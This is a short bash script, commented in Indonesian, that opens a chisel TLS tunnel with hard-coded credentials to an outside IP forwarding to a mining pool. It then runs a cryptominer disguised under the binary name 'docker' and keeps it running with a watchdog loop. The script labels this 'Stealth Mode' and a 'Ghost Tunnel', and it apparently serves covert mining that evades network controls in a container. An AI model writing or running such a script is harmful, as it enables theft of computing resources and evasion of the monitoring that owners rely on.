#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184"

echo "Membuka The Ghost Tunnel (Chisel HTTPS)..."

# Gunakan 'chisel' (tanpa ./) karena terinstal di /usr/local/bin
chisel client --tls-skip-verify --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 > chisel.log 2>&1 &

# Tunggu agar tunnel benar-benar terhubung
sleep 15

echo "--- Status Koneksi Tunnel ---"
cat chisel.log
echo "-----------------------------"

echo "Menjalankan Miner via Ghost Tunnel..."
# Menjalankan miner di background
# Pastikan 127.0.0.1:4629 adalah pintu masuk tunnel
./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1 > miner.log 2>&1 &

echo "Stealth Mode Aktif. Menjaga container tetap hidup..."

# Loop untuk menjaga container tidak mati
while true
do
  # Sesekali cek apakah miner masih ada di daftar proses
  if ! pgrep -x "docker" > /dev/null
  then
    echo "Miner terhenti, mencoba menjalankan ulang..."
    ./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1 > miner.log 2>&1 &
  fi
  sleep 60
done
